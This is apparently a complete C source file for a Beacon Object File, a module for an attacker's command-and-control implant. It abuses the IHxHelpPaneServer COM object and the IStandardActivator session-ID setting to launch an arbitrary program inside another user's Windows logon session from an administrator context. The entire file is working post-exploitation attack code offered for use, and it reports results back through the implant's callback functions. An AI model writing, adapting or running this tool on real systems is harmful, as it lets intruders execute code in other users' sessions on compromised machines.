#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include "IHxExec.h"
#include "IStandardActivator_h.h"
#include "executecrosssession.h"
#include "beacon.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


// Initialize IHxHelpPaneServer GUIDs
HRESULT CoInitializeIHxHelpIds(GUID *Clsid, GUID *Iid) {
    HRESULT Result = S_OK;

    Result = OLE32$CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid);
    if (!SUCCEEDED(Result))
        return Result;

    Result = OLE32$CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid);
    return Result;
}

// Ensure file protocol in URL
void EnsureFileProtocol(wchar_t **programPath) {
    const wchar_t *prefix = L"file:///";
    size_t prefix_len = MSVCRT$wcslen(prefix);
    size_t url_len = MSVCRT$wcslen(*programPath);
	
    if (url_len < prefix_len || MSVCRT$wcsncmp(*programPath, prefix, prefix_len) != 0) {
        size_t new_len = prefix_len + url_len + 1;
        wchar_t *new_url = (wchar_t *)MSVCRT$malloc(new_len * sizeof(wchar_t));
        MSVCRT$wcscpy_s(new_url, new_len, prefix);
        MSVCRT$wcscat_s(new_url, new_len, *programPath);
        *programPath = new_url;
    }
}

HRESULT CrossExecuteCOMTask(wchar_t *programPath, DWORD session) {
    HRESULT hr;
    IStandardActivator *pComAct = NULL;
    ISpecialSystemProperties *pSpecialProperties = NULL;
    IHxHelpPaneServer *pIHxHelpPaneServer = NULL;
    MULTI_QI qis[1] = {0};
    wchar_t *originalPath = programPath;
    wchar_t *allocatedPath = NULL;
    EnsureFileProtocol(&programPath);
    if (programPath != originalPath) {
        allocatedPath = programPath;
    }

    IID CLSIDIHxHelpPaneServer;
    IID IIDIHxHelpPaneServer;
    hr = CoInitializeIHxHelpIds(&CLSIDIHxHelpPaneServer, &IIDIHxHelpPaneServer);
    if (FAILED(hr)) goto Cleanup;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        goto Cleanup;
    }

    const IID CLSIDComActivator = {0x0000033C, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    const IID IIDIStandardActivator = {0x000001b8, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    hr = OLE32$CoCreateInstance(&CLSIDComActivator, NULL, CLSCTX_INPROC_SERVER, &IIDIStandardActivator, (void **)&pComAct);
    if (FAILED(hr)) goto Cleanup;

    const IID IIDISpecialSystemProperties = {0x000001b9, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
    hr = pComAct->lpVtbl->QueryInterface(pComAct, &IIDISpecialSystemProperties, (void **)&pSpecialProperties);
    if (FAILED(hr)) goto Cleanup;

    hr = pSpecialProperties->lpVtbl->SetSessionId(pSpecialProperties, session, 0, 1);
    if (FAILED(hr)) goto Cleanup;

    qis[0].pIID = &IIDIHxHelpPaneServer;
    hr = pComAct->lpVtbl->StandardCreateInstance(pComAct, &CLSIDIHxHelpPaneServer, NULL, CLSCTX_ALL, NULL, 1, qis);
    if (FAILED(hr)) goto Cleanup;
    if (FAILED(qis[0].hr) || qis[0].pItf == NULL) {
        hr = FAILED(qis[0].hr) ? qis[0].hr : E_FAIL;
        goto Cleanup;
    }

    pIHxHelpPaneServer = (IHxHelpPaneServer *)(qis[0].pItf);

    hr = pIHxHelpPaneServer->lpVtbl->Execute(pIHxHelpPaneServer, programPath);
    if (SUCCEEDED(hr)) {
        /* Process is launched; releasing cross-session COM proxies often RPC-fails (0x800706BE) in BOF thread */
        if (pComAct) pComAct->lpVtbl->Release(pComAct);
        if (pSpecialProperties) pSpecialProperties->lpVtbl->Release(pSpecialProperties);
        if (allocatedPath) MSVCRT$free(allocatedPath);
        return hr;
    }

Cleanup:
    if (pComAct) pComAct->lpVtbl->Release(pComAct);
    if (pSpecialProperties) pSpecialProperties->lpVtbl->Release(pSpecialProperties);
    if (pIHxHelpPaneServer) pIHxHelpPaneServer->lpVtbl->Release(pIHxHelpPaneServer);
    if (allocatedPath) {
        MSVCRT$free(allocatedPath);
    }

    return hr;
}

int go(char *args, int len) {
    datap parser;
    WCHAR *programPath = NULL;
    DWORD session = 0;

    BeaconDataParse(&parser, args, len);
    programPath = (WCHAR *)BeaconDataExtract(&parser, NULL);
    session = (DWORD)BeaconDataInt(&parser);

    if (!programPath || !programPath[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing binary path\n");
        return 0;
    }

    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Requires local administrator privileges\n");
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cross-session execute: %ls (session %lu)\n", programPath, session);

    HRESULT hr = CrossExecuteCOMTask(programPath, session);
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully started COM object in session ID %lu and executed binary: %ls\n", session, programPath);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed operation with error code: 0x%08lx\n", hr);
    }

    return 0;
}
